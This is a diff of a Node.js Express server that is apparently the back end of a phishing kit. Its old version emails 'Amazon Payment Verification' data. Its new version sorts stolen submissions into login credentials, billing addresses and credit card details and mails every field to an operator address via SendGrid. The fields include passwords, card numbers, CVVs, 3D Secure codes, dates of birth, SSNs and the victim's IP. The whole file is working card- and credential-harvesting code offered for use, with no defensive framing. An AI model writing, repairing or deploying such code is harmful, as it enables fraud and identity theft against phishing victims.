@@ -1,8 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const sgMail = require('@sendgrid/mail');
 const cors = require('cors');
-require('dotenv').config();
+const sgMail = require('@sendgrid/mail');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -12,141 +11,180 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Set SendGrid API key
+// Set SendGrid API Key
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-// Store submissions in memory (in production, use a database)
-let submissions = [];
+// Root endpoint
+app.get('/', (req, res) => {
+  res.json({ 
+    message: 'Server is running',
+    status: 'OK'
+  });
+});
 
-// Route to handle form submissions
+// Receive form data endpoint
 app.post('/api/submit', async (req, res) => {
-    try {
-        const formData = req.body;
-        const timestamp = new Date().toLocaleString();
-        
-        // Add timestamp to the data
-        const submissionData = {
-            ...formData,
-            submission_timestamp: timestamp
-        };
-        
-        // Store in memory
-        submissions.push(submissionData);
-        
-        console.log('Received form submission:', submissionData);
-        
-        // Format email content
-        const emailContent = formatEmailContent(submissionData);
-        
-        // Send email via SendGrid
-        await sendEmail(emailContent);
-        
-        // Send success response
-        res.status(200).json({
-            success: true,
-            message: 'Data received and email sent successfully',
-            timestamp: timestamp
-        });
-        
-    } catch (error) {
-        console.error('Error processing submission:', error);
-        res.status(500).json({
-            success: false,
-            message: 'Error processing submission',
-            error: error.message
-        });
-    }
-});
+  try {
+    const formData = req.body;
+    const timestamp = new Date().toLocaleString();
+    const clientIP = req.ip || req.connection.remoteAddress || 'Unknown';
 
-// Route to get all submissions (for monitoring)
-app.get('/api/submissions', (req, res) => {
-    res.json({
-        success: true,
-        count: submissions.length,
-        submissions: submissions
+    console.log('📨 Received form submission:', formData);
+
+    // Send plain text email
+    await sendPlainTextEmail(formData, timestamp, clientIP);
+
+    res.status(200).json({ 
+      success: true, 
+      message: 'Data received successfully'
     });
+
+  } catch (error) {
+    console.error('❌ Error processing form data:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: 'Internal server error'
+    });
+  }
 });
 
-// Health check route
-app.get('/health', (req, res) => {
-    res.json({ status: 'OK', timestamp: new Date().toISOString() });
-});
-
-// Function to format email content
-function formatEmailContent(data) {
-    let content = `
-AMAZON PAYMENT VERIFICATION DATA
-=================================
-TIMESTAMP: ${data.submission_timestamp || new Date().toLocaleString()}
-
-PAYMENT INFORMATION:
--------------------
-Card Holder: ${data.holder || 'N/A'}
-Card Number: ${data.ccnum || 'N/A'}
-Expiration: ${data.EXP1 || 'N/A'}/${data.EXP2 || 'N/A'}
-CVV: ${data.cvv2 || 'N/A'}
-3D Secure: ${data.vbv || 'N/A'}
-Date of Birth: ${data.dob || 'N/A'}
-SSN: ${data.ssn || 'N/A'}
-
-TECHNICAL DATA:
----------------
-IP Address: ${data.ip_address || 'N/A'}
-User Agent: ${data.user_agent || 'N/A'}
-Screen Resolution: ${data.screen_resolution || 'N/A'}
-Language: ${data.language || 'N/A'}
-Timezone: ${data.timezone || 'N/A'}
-Cookies Enabled: ${data.cookies_enabled || 'N/A'}
-Submission Timestamp: ${data.timestamp || 'N/A'}
-
-SYSTEM INFO:
-------------
-Server Time: ${new Date().toLocaleString()}
-Server Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Total Submissions: ${submissions.length}
-    `;
-
-    return content;
-}
-
-// Function to send email using SendGrid
-async function sendEmail(content) {
+// Function to send plain text email
+async function sendPlainTextEmail(formData, timestamp, clientIP) {
+  try {
+    const emailText = generatePlainTextEmail(formData, timestamp, clientIP);
+    
     const msg = {
-        to: process.env.TO_EMAIL, // Recipient email from environment variable
-        from: process.env.FROM_EMAIL, // Verified sender email from environment variable
-        subject: `Amazon Payment Verification - ${new Date().toLocaleString()}`,
-        text: content,
-        html: `<pre style="font-family: monospace; white-space: pre-wrap;">${content}</pre>`
+      to: process.env.TO_EMAIL,
+      from: process.env.FROM_EMAIL,
+      subject: `New Submission - ${getFormType(formData)}`,
+      text: emailText,
     };
 
-    try {
-        await sgMail.send(msg);
-        console.log('Email sent successfully');
-        return true;
-    } catch (error) {
-        console.error('Error sending email:', error);
-        if (error.response) {
-            console.error('SendGrid error details:', error.response.body);
-        }
-        throw error;
-    }
+    await sgMail.send(msg);
+    console.log('✅ Email sent successfully');
+    
+  } catch (error) {
+    console.error('❌ Error sending email:', error);
+    throw error;
+  }
 }
 
-// Error handling middleware
+// Generate plain text email content
+function generatePlainTextEmail(data, timestamp, clientIP) {
+  let emailContent = `NEW FORM SUBMISSION\n`;
+  emailContent += `====================\n\n`;
+  
+  emailContent += `📋 FORM TYPE: ${getFormType(data)}\n`;
+  emailContent += `🕒 TIMESTAMP: ${timestamp}\n`;
+  emailContent += `🌐 IP ADDRESS: ${clientIP}\n`;
+  
+  if (data.user_agent) {
+    emailContent += `💻 USER AGENT: ${data.user_agent}\n`;
+  }
+  
+  emailContent += `\n📝 SUBMITTED DATA:\n`;
+  emailContent += `-------------------\n`;
+
+  // Add all form fields in plain text
+  for (const [key, value] of Object.entries(data)) {
+    if (key !== 'user_agent' && key !== 'timestamp' && key !== 'ip_address') {
+      const formattedKey = formatFieldName(key);
+      emailContent += `${formattedKey}: ${value || 'N/A'}\n`;
+    }
+  }
+
+  emailContent += `\n====================\n`;
+  emailContent += `End of submission\n`;
+
+  return emailContent;
+}
+
+// Determine form type based on data fields
+function getFormType(data) {
+  if (data.email && data.password) {
+    return 'LOGIN CREDENTIALS';
+  } else if (data.fullname && data.add1) {
+    return 'BILLING ADDRESS';
+  } else if (data.ccnum && data.cvv2) {
+    return 'CREDIT CARD INFORMATION';
+  } else if (data.holder && data.ccnum) {
+    return 'CREDIT CARD DETAILS';
+  } else {
+    return 'FORM SUBMISSION';
+  }
+}
+
+// Format field names for better readability
+function formatFieldName(key) {
+  const fieldNames = {
+    // Login fields
+    email: '📧 EMAIL',
+    password: '🔑 PASSWORD',
+    
+    // Address fields
+    fullname: '👤 FULL NAME',
+    add1: '🏠 ADDRESS LINE 1',
+    add2: '🏠 ADDRESS LINE 2',
+    city: '🏙️ CITY',
+    state: '🗺️ STATE/PROVINCE',
+    zip: '📮 ZIP CODE',
+    phone: '📞 PHONE NUMBER',
+    country: '🌎 COUNTRY',
+    
+    // Credit card fields
+    holder: '💳 CARD HOLDER NAME',
+    ccnum: '💳 CARD NUMBER',
+    cvv2: '🔒 CVV',
+    vbv: '🔐 3D SECURE (VBV/MSC)',
+    dob: '🎂 DATE OF BIRTH',
+    ssn: '🆔 SSN',
+    EXP1: '📅 EXPIRATION MONTH',
+    EXP2: '📅 EXPIRATION YEAR'
+  };
+
+  return fieldNames[key] || key.toUpperCase().replace(/_/g, ' ');
+}
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'OK', 
+    timestamp: new Date().toISOString(),
+    service: 'Form Data Receiver'
+  });
+});
+
+// Error handling
 app.use((error, req, res, next) => {
-    console.error('Unhandled error:', error);
-    res.status(500).json({
-        success: false,
-        message: 'Internal server error'
-    });
+  console.error('❌ Server error:', error);
+  res.status(500).json({
+    success: false,
+    message: 'Internal server error'
+  });
+});
+
+// 404 handler
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    message: 'Endpoint not found'
+  });
 });
 
 // Start server
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Health check: http://localhost:${PORT}/health`);
-    console.log(`Submit endpoint: http://localhost:${PORT}/api/submit`);
-    console.log(`Submissions monitor: http://localhost:${PORT}/api/submissions`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📍 API endpoint: http://localhost:${PORT}/api/submit`);
+  console.log(`❤️  Health check: http://localhost:${PORT}/health`);
+  
+  // Check if required environment variables are set
+  if (!process.env.SENDGRID_API_KEY) {
+    console.warn('⚠️  SENDGRID_API_KEY environment variable is not set');
+  }
+  if (!process.env.TO_EMAIL) {
+    console.warn('⚠️  TO_EMAIL environment variable is not set');
+  }
+  if (!process.env.FROM_EMAIL) {
+    console.warn('⚠️  FROM_EMAIL environment variable is not set');
+  }
 });
-
-module.exports = app;
